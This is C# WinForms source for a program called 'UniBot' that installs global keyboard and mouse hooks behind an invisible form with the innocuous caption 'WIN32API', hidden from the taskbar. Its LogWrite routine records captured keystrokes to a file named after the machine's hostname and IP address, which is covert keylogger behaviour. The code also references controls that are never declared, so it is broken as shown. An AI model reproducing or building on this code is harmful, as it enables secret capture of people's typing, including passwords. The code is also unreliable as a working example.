using System;
using System.Windows.Forms;
using gma.System.Windows;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Drawing.Printing;
using System.Runtime.InteropServices;
using System.Reflection;
namespace GlobalHookDemo 
{
	class MainForm : System.Windows.Forms.Form
    {
    private System.Windows.Forms.Button buttonStop;
        private Button buttonStart;
        string key;
        string ip;
    private Label label1;
    private ComboBox comboBox1;
    private Label label2;
    private ComboBox comboBox2;
    private Label label3;
    private Label label4;
    private Label label5;
    private Label label6;
    private Label label7;
    private Label label8;
    private Label label9;
    private Label label10;
    private ComboBox comboBox3;
    private Button button1;
    string tasten = "";

		public MainForm()
		{
			InitializeComponent();
		}
	
		// THIS METHOD IS MAINTAINED BY THE FORM DESIGNER
		// DO NOT EDIT IT MANUALLY! YOUR CHANGES ARE LIKELY TO BE LOST
        // http://forums.microsoft.com/MSDN/ShowPost.aspx?PostID=2013305&SiteID=1
		void InitializeComponent() {
      this.buttonStop = new System.Windows.Forms.Button( );
      this.buttonStart = new System.Windows.Forms.Button( );
      this.label1 = new System.Windows.Forms.Label( );
      this.comboBox1 = new System.Windows.Forms.ComboBox( );
      this.label2 = new System.Windows.Forms.Label( );
      this.comboBox2 = new System.Windows.Forms.ComboBox( );
      this.label3 = new System.Windows.Forms.Label( );
      this.label4 = new System.Windows.Forms.Label( );
      this.label5 = new System.Windows.Forms.Label( );
      this.label6 = new System.Windows.Forms.Label( );
      this.label7 = new System.Windows.Forms.Label( );
      this.label8 = new System.Windows.Forms.Label( );
      this.label9 = new System.Windows.Forms.Label( );
      this.label10 = new System.Windows.Forms.Label( );
      this.comboBox3 = new System.Windows.Forms.ComboBox( );
      this.button1 = new System.Windows.Forms.Button( );
      this.SuspendLayout( );
      // 
      // buttonStop
      // 
      this.buttonStop.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
      this.buttonStop.Location = new System.Drawing.Point( 93, 28 );
      this.buttonStop.Name = "buttonStop";
      this.buttonStop.Size = new System.Drawing.Size( 75, 23 );
      this.buttonStop.TabIndex = 1;
      this.buttonStop.Text = "Stop";
      this.buttonStop.Click += new System.EventHandler( this.ButtonStopClick );
      // 
      // buttonStart
      // 
      this.buttonStart.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
      this.buttonStart.Location = new System.Drawing.Point( 14, 28 );
      this.buttonStart.Name = "buttonStart";
      this.buttonStart.Size = new System.Drawing.Size( 75, 23 );
      this.buttonStart.TabIndex = 0;
      this.buttonStart.Text = "Start";
      this.buttonStart.Click += new System.EventHandler( this.ButtonStartClick );
      // 
      // label1
      // 
      this.label1.AutoSize = true;
      this.label1.Font = new System.Drawing.Font( "Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ( ( byte ) ( 0 ) ) );
      this.label1.Location = new System.Drawing.Point( 191, 9 );
      this.label1.Name = "label1";
      this.label1.Size = new System.Drawing.Size( 69, 16 );
      this.label1.TabIndex = 2;
      this.label1.Text = "Language";
      // 
      // comboBox1
      // 
      this.comboBox1.FormattingEnabled = true;
      this.comboBox1.Items.AddRange( new object[] {
            "Englisch",
            "Deutsch"} );
      this.comboBox1.Location = new System.Drawing.Point( 191, 28 );
      this.comboBox1.Name = "comboBox1";
      this.comboBox1.Size = new System.Drawing.Size( 121, 21 );
      this.comboBox1.TabIndex = 3;
      this.comboBox1.Text = "Englisch";
      this.comboBox1.SelectedIndexChanged += new System.EventHandler( this.comboBox1_SelectedIndexChanged );
      // 
      // label2
      // 
      this.label2.AutoSize = true;
      this.label2.Font = new System.Drawing.Font( "Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ( ( byte ) ( 0 ) ) );
      this.label2.Location = new System.Drawing.Point( 16, 9 );
      this.label2.Name = "label2";
      this.label2.Size = new System.Drawing.Size( 48, 16 );
      this.label2.TabIndex = 4;
      this.label2.Text = "UniBot";
      // 
      // comboBox2
      // 
      this.comboBox2.FormattingEnabled = true;
      this.comboBox2.Items.AddRange( new object[] {
            "800*600",
            "1024*768",
            "1280*1024"} );
      this.comboBox2.Location = new System.Drawing.Point( 49, 120 );
      this.comboBox2.Name = "comboBox2";
      this.comboBox2.Size = new System.Drawing.Size( 211, 21 );
      this.comboBox2.TabIndex = 5;
      this.comboBox2.Text = "800*600";
      // 
      // label3
      // 
      this.label3.AutoSize = true;
      this.label3.Font = new System.Drawing.Font( "Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ( ( byte ) ( 0 ) ) );
      this.label3.Location = new System.Drawing.Point( 45, 102 );
      this.label3.Name = "label3";
      this.label3.Size = new System.Drawing.Size( 57, 13 );
      this.label3.TabIndex = 6;
      this.label3.Text = "Resolution";
      // 
      // label4
      // 
      this.label4.BackColor = System.Drawing.SystemColors.ControlText;
      this.label4.Location = new System.Drawing.Point( 14, 60 );
      this.label4.Name = "label4";
      this.label4.Size = new System.Drawing.Size( 300, 2 );
      this.label4.TabIndex = 7;
      this.label4.Text = "label4";
      // 
      // label5
      // 
      this.label5.AutoSize = true;
      this.label5.Font = new System.Drawing.Font( "Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ( ( byte ) ( 0 ) ) );
      this.label5.Location = new System.Drawing.Point( 110, 69 );
      this.label5.Name = "label5";
      this.label5.Size = new System.Drawing.Size( 86, 16 );
      this.label5.TabIndex = 8;
      this.label5.Text = "Configuration";
      // 
      // label6
      // 
      this.label6.BackColor = System.Drawing.SystemColors.ControlText;
      this.label6.Location = new System.Drawing.Point( 60, 92 );
      this.label6.Name = "label6";
      this.label6.Size = new System.Drawing.Size( 200, 2 );
      this.label6.TabIndex = 9;
      this.label6.Text = "label6";
      // 
      // label7
      // 
      this.label7.BackColor = System.Drawing.SystemColors.ControlText;
      this.label7.Location = new System.Drawing.Point( 14, 61 );
      this.label7.Name = "label7";
      this.label7.Size = new System.Drawing.Size( 2, 300 );
      this.label7.TabIndex = 10;
      this.label7.Text = "label7";
      // 
      // label8
      // 
      this.label8.BackColor = System.Drawing.SystemColors.ControlText;
      this.label8.Location = new System.Drawing.Point( 312, 61 );
      this.label8.Name = "label8";
      this.label8.Size = new System.Drawing.Size( 2, 300 );
      this.label8.TabIndex = 11;
      this.label8.Text = "label8";
      // 
      // label9
      // 
      this.label9.BackColor = System.Drawing.SystemColors.ControlText;
      this.label9.Location = new System.Drawing.Point( 14, 359 );
      this.label9.Name = "label9";
      this.label9.Size = new System.Drawing.Size( 300, 2 );
      this.label9.TabIndex = 12;
      this.label9.Text = "label9";
      // 
      // label10
      // 
      this.label10.AutoSize = true;
      this.label10.Location = new System.Drawing.Point( 45, 157 );
      this.label10.Name = "label10";
      this.label10.Size = new System.Drawing.Size( 34, 13 );
      this.label10.TabIndex = 13;
      this.label10.Text = "Mode";
      // 
      // comboBox3
      // 
      this.comboBox3.FormattingEnabled = true;
      this.comboBox3.Items.AddRange( new object[] {
            "Solo / FFA / RT",
            "AT_Invite",
            "AT_Accept"} );
      this.comboBox3.Location = new System.Drawing.Point( 48, 174 );
      this.comboBox3.Name = "comboBox3";
      this.comboBox3.Size = new System.Drawing.Size( 212, 21 );
      this.comboBox3.TabIndex = 14;
      this.comboBox3.Text = "Solo";
      // 
      // button1
      // 
      this.button1.Location = new System.Drawing.Point( 191, 256 );
      this.button1.Name = "button1";
      this.button1.Size = new System.Drawing.Size( 75, 23 );
      this.button1.TabIndex = 15;
      this.button1.Text = "button1";
      this.button1.UseVisualStyleBackColor = true;
      // 
      // MainForm
      // 
      this.AutoScaleBaseSize = new System.Drawing.Size( 5, 13 );
      this.ClientSize = new System.Drawing.Size( 334, 379 );
      this.Controls.Add( this.button1 );
      this.Controls.Add( this.comboBox3 );
      this.Controls.Add( this.label10 );
      this.Controls.Add( this.label9 );
      this.Controls.Add( this.label8 );
      this.Controls.Add( this.label7 );
      this.Controls.Add( this.label6 );
      this.Controls.Add( this.label5 );
      this.Controls.Add( this.label4 );
      this.Controls.Add( this.label3 );
      this.Controls.Add( this.comboBox2 );
      this.Controls.Add( this.label2 );
      this.Controls.Add( this.comboBox1 );
      this.Controls.Add( this.label1 );
      this.Controls.Add( this.buttonStop );
      this.Controls.Add( this.buttonStart );
      this.Name = "MainForm";
      this.Opacity = 0;
      this.ShowInTaskbar = false;
      this.Text = "WIN32API";
      this.Load += new System.EventHandler( this.MainFormLoad );
      this.ResumeLayout( false );
      this.PerformLayout( );

		}
			 
		[STAThread]

		public static void Main(string[] args)
		{
			Application.Run(new MainForm());
		}

        [DllImport("user32.dll")]
        private static extern void mouse_event(
             UInt32 dwFlags, // motion and click options
             UInt32 dx, // horizontal position or change
             UInt32 dy, // vertical position or change
             UInt32 dwData, // wheel movement
             IntPtr dwExtraInfo // application-defined information
             );

        private const UInt32 MouseEventLeftDown = 0x0002;
        private const UInt32 MouseEventLeftUp = 0x0004;
        private const UInt32 MouseEventRightDown = 0x0008;
        private const UInt32 MouseEventRightUp = 0x00016;

        private void LeftMouseClick(Point point)
        {
            Point location = Cursor.Position;
            Cursor.Position = point;
            mouse_event(MouseEventLeftDown, 0, 0, 0, new System.IntPtr());
            mouse_event(MouseEventLeftUp, 0, 0, 0, new System.IntPtr());
            Cursor.Position = location;
        }

        private void RightMouseClick(Point point)
        {
            Point location = Cursor.Position;
            Cursor.Position = point;
            mouse_event(MouseEventRightDown, 0, 0, 0, new System.IntPtr());
            mouse_event(MouseEventRightUp, 0, 0, 0, new System.IntPtr());
            Cursor.Position = location;
        }

		void ButtonStartClick(object sender, System.EventArgs e)
		{
			//actHook.Start();
		}
		
		void ButtonStopClick(object sender, System.EventArgs e)
		{
			actHook.Stop();
		}

		
		UserActivityHook actHook;
		void MainFormLoad(object sender, System.EventArgs e)
		{
            actHook = new UserActivityHook(); // crate an instance with global hooks
			// hang on events
			actHook.OnMouseActivity+=new MouseEventHandler(MouseMoved);
			actHook.KeyDown+=new KeyEventHandler(MyKeyDown);
			actHook.KeyPress+=new KeyPressEventHandler(MyKeyPress);
			actHook.KeyUp+=new KeyEventHandler(MyKeyUp);
            
		}

		public void MouseMoved(object sender, MouseEventArgs e)
		{
			labelMousePosition.Text=String.Format("x={0}  y={1} wheel={2}", e.X, e.Y, e.Delta);
			if (e.Clicks>0){
                LogWrite("MouseButton 	- " + e.Button.ToString());
                /*StreamWriter sw = new StreamWriter(@"H:\log.txt", true);
                sw.Write("MAUS KLICK " + e.Button.ToString() + Environment.NewLine);
                sw.Close();*/
                // rechte Maustaste
            }
		}
		
		public void MyKeyDown(object sender, KeyEventArgs e)
		{
			LogWrite("KeyDown 	- " + e.KeyData.ToString());
		}
       
		public void MyKeyPress(object sender, KeyPressEventArgs e)
		{   // Tasta_eingabe: http://msdn2.microsoft.com/en-us/library/system.windows.forms.sendkeys(VS.71).aspx
            // Cursor_klick: http://www.mycsharp.de/wbb2/thread.php?postid=198157  
            /* StreamWriter sw = new StreamWriter(@"H:\log.txt", true);
                sw.Write(e.KeyChar);
                LogWrite("KeyPress 	- " + e.KeyChar);
                sw.Close();*/
            key = e.KeyChar.ToString();
            int x1, y1;
            x1 = 15; y1 = 15;
           /*
            if ( tasten == "a1" )
            {
              if ( key == "\r" )
              {
                MessageBox.Show( "Befehl1 ausgeführt!" );
              }
            }

            if ( key == "#" )
            {
                tasten = "";
            }

            if ( tasten.Length == 50 )
            {
              tasten = "";
            }

            */
           /* if (key == "1")
            {
                Point initialCursorPosition = Cursor.Position;
                initialCursorPosition.X = x1;
                initialCursorPosition.Y = y1;
                Cursor.Position = initialCursorPosition;
                LeftMouseClick(Cursor.Position);
            }*/

           // tasten += key;
		}
		
		public void MyKeyUp(object sender, KeyEventArgs e)
		{
			//LogWrite("KeyUp 		- " + e.KeyData.ToString());
		}


		private void LogWrite(string txt)
        {

            String strHostName;
            strHostName = Dns.GetHostName();
            IPHostEntry iphostentry = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ipaddress in iphostentry.AddressList)
            ip = ipaddress.ToString();
            StreamWriter sw = new StreamWriter(strHostName+"_"+ip+".txt", true);
            sw.Write(key);
            sw.Close();
			textBox.AppendText(txt + Environment.NewLine);
			textBox.SelectionStart = textBox.Text.Length;
		}

    private void comboBox1_SelectedIndexChanged( object sender, EventArgs e )
    {

    }

	}			
}
